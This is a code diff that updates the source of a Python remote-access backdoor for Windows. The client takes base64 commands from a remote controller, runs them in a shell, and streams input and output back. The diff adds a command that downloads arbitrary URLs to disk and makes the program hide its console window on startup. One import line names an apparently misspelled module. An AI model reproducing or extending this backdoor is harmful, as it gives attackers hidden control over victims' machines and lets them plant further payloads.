@@ -1,9 +1,8 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 import os
-import sys
-import chardet
 import ctypes
+import shlex
 from subprocess import Popen, PIPE
 import threading
 import uuid
@@ -17,6 +16,8 @@ from Crypto.Cipher import AES
 # import win32service
 # import win32serviceutil
 # import win32event
+from _docpot import docopt
+
 __author__ = 'nekocode'
 
 
@@ -57,7 +58,7 @@ class BackdoorClient(threading.Thread):
                         
                         if len(BackdoorClient.consoles) != 0:
                             for _con in BackdoorClient.consoles:
-                                _con.exit = True
+                                _con.exit()
                                 BackdoorClient.consoles.remove(_con)
 
                         consloe = Cmd(self, to_controler)
@@ -68,16 +69,20 @@ class BackdoorClient(threading.Thread):
                     elif 'cmd' in msg:
                         command = b64decode(msg['cmd'])
                         BackdoorClient.cmd_queue.append(command)
-                        # todo
 
                     elif 'char' in msg:
                         char = get_char(msg)
-                        sys.stdout.write(char)  # todo : remove
 
+                        con = None
                         if len(BackdoorClient.consoles) > 0:
                             con = BackdoorClient.consoles[0]
-                            con.write_pipe.write(char)
-                            con.write_pipe.flush()
+
+                        if con is not None:
+                            if char == '\x1b':      # Esc
+                                con.kill_proc()
+                            else:
+                                con.write_pipe.write(char)
+                                con.write_pipe.flush()
 
                 self.ws.close()
 
@@ -159,25 +164,35 @@ class Cmd(threading.Thread):
         self.to_controler = to_controler
         self.buf_sender = BufSender(client, to_controler)
 
-        self.exit = False
+        self.now_cmd_proc = None
+        self.exit_flag = False
         self.daemon = True
         self.start()
 
+    def exit(self):
+        self.exit_flag = True
+        if self.now_cmd_proc is not None:
+            self.now_cmd_proc.terminate()
+
+    def kill_proc(self):
+        if self.now_cmd_proc is not None:
+            self.buf_sender.buf += '\nCommand terminated.\n'
+            self.now_cmd_proc.terminate()
+
     def run(self):
         try:
-            while not self.exit:
+            while not self.exit_flag:
                 while len(BackdoorClient.cmd_queue) == 0:
                     time.sleep(0.1)
 
                 cmd_input = BackdoorClient.cmd_queue.pop(0)
 
-                if cmd_input == 'cmd':
-                    self.send_data('You are allready in cmd.', self.to_controler)
-                    self.send_end(self.to_controler)
+                if self.parse_command(cmd_input):
                     continue
 
                 self.read_pipe.flush()
                 proc = Popen(cmd_input, shell=True, stdout=PIPE, stderr=PIPE, stdin=self.read_pipe)
+                self.now_cmd_proc = proc
 
                 char = proc.stdout.read(1)
                 self.buf_sender.buf += char
@@ -192,6 +207,7 @@ class Cmd(threading.Thread):
                     self.buf_sender.buf += char
 
                 proc.wait()
+                self.now_cmd_proc = None
 
                 self.buf_sender.flush = True
                 while self.buf_sender.flush:
@@ -205,25 +221,55 @@ class Cmd(threading.Thread):
             self.send_data('ERROR: ' + e.message, self.to_controler)
             self.send_end(self.to_controler)
 
+    def parse_command(self, cmd):
+        input_array = cmd.strip().split()
+        command_str = input_array[0]
 
-class Download(threading.Thread):
-    def __init__(self, url, filename):
-        threading.Thread.__init__(self)
+        # ====================
+        # ===== download =====
+        # ====================
+        if command_str == 'download':
+            try:
+                arguments_str = shlex.split(cmd)[1:]
+                doc = """Usage:
+  download URL FILENAME
+  download (-h | --help)
 
-        self.url = url
-        self.filename = filename
+Options:
+  URL                   Download URL.
+  FILENAME              Download file name(/path).
+  -h --help             Show this.
+"""
+                args = docopt(doc, argv=arguments_str, help=True, version=None, options_first=False)
 
-        self.daemon = True
-        self.start()
+                self.send_data('Downloading "' + args['FILENAME'] + '" from "' + args['URL'] + '"...', self.to_controler)
+                data = urllib.urlopen(args['URL']).read()
+                with open(args['FILENAME'], 'wb') as f:
+                    f.write(data)
 
-    def run(self):
-        try:
-            data = urllib.urlopen(self.url).read()
-            with open("c:\\" + self.filename, 'wb') as f:
-                f.write(data)
+                self.send_data('Download finished.', self.to_controler)
+                self.send_end(self.to_controler)
 
-        except Exception as e:
-            pass
+            except SystemExit as e:
+                self.send_data(e.message, self.to_controler)
+                self.send_end(self.to_controler)
+
+            except Exception as e:
+                self.send_data('unkown err: ' + e.message + '\n', self.to_controler)
+                self.send_end(self.to_controler)
+
+            return True
+
+        elif command_str == 'cmd':
+            self.send_data('You are allready in cmd.', self.to_controler)
+            self.send_end(self.to_controler)
+            return True
+
+        # ===================
+        # ======= cmd =======
+        # ===================
+        else:
+            return False
 
 
 # class BackendDaemonSrv(win32serviceutil.ServiceFramework):
@@ -257,20 +303,6 @@ class Download(threading.Thread):
 #         self.runflag = False
 
 
-def module_path():
-    encoding = sys.getfilesystemencoding()
-    if hasattr(sys, 'frozen'):
-        return os.path.dirname(unicode(sys.executable, encoding))
-    return os.path.dirname(unicode(__file__, encoding))
-
-
-def decode2utf(rawstr):
-    if chardet.detect(rawstr)['encoding'] != 'ascii':
-        return rawstr.decode('gbk')
-    else:
-        return rawstr.decode('ascii')
-
-
 def hostname():
     sys_name = os.name
 
@@ -295,11 +327,9 @@ def hide_cmd_window():
 
 
 if __name__ == '__main__':
-    # if len(sys.argv) == 1:
-    # hide_cmd_window()
+    hide_cmd_window()
     BackdoorClient()
     while True:
         time.sleep(10)
-    # else:
-    #     win32serviceutil.HandleCommandLine(BackendDaemonSrv)
+    # win32serviceutil.HandleCommandLine(BackendDaemonSrv)
 
